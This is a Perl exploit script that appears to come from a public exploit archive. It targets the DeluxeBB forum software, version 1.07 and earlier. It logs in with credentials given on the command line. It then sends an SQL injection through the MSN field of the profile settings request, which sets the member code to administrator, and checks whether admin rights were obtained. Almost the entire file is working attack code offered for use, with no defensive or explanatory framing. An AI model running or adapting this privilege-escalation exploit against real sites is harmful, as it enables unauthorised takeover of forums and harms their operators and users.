#!/usr/bin/perl
# DeluxeBB <= 1.07 Create Admin Exploit
#
## www.h4ckerz.com / www.hackerz.ir / www.aria-security.net
# ./2006-6-25
### Coded & Discovered By Hessam-x / Hessamx-at-Hessamx.net

use IO::Socket; 
use LWP::UserAgent;
use HTTP::Cookies;


 $host = $ARGV[0];
 $uname = $ARGV[1];
 $passwd = $ARGV[2];
 $url = "http://".$host;
 
 print q(
 ###########################################################
 #          DeluxeBB <= 1.07 Create Admin Exploit          # 
 #           www.hackerz.ir - www.h4ckerz.com              #
 ################### Coded By Hessam-x #####################

);


 
 if (@ARGV < 3) {
 print " #  usage : hx.pl [host&path] [uname] [pass]\n"; 
 print " #  E.g : hx.pl www.milw0rm.com/deluxebb/ str0ke 123456\n"; 
  exit();
 }
 
  
    print " [~] User/Password : $uname/$passwd \n";
    print " [~] Host : $host \n";
    print " [~] Login ... ";



 # Login In DeluxeBB <= 1.07 Create Admin Exploit
 
 $xpl = LWP::UserAgent->new() or die;
 $cookie_jar = HTTP::Cookies->new();

 $xpl->cookie_jar( $cookie_jar );
 $res = $xpl->post($url.'misc.php',
 Content => [
 "sub" => "login",
 "name" => "$uname",
 "password" => "$passwd",
 "submit" => "Log-in",
 "redirect" => "",
 "expiry" => "990090909",
 ],);
 
  if($cookie_jar->as_string =~ /memberpw=(.*?);/) { 
  print "successfully .\n";
  } else { 
  print "UNsuccessfully !\n";
  print " [-] Can not Login In $host !\n"; 
  print $cookie_jar->as_string;
  exit(); 
  }

  # Creat Admin :)

$req = $xpl->get($url.'cp.php?sub=settings&xemail=h4x0r@h4x0r.net&xhideemail=0&xmsn=h4x0r\',membercode=\'5&xicq=&xaim=&xyim=&xlocation=&xsite=&languagex=English&skinx=default&xthetimeoffset=0&xthedateformat=d.m.y&xthetimeformat=12&invisiblebrowse=0&markposts=15&submit=Update');
$tst = $xpl->get($url.'index.php');
if ($tst->as_string =~ /Admin Cp/) { 
print " [+] You Are Admin Now !!";
} else {
    print " [-] Exploit Failed !";
    }

# milw0rm.com [2006-06-25]
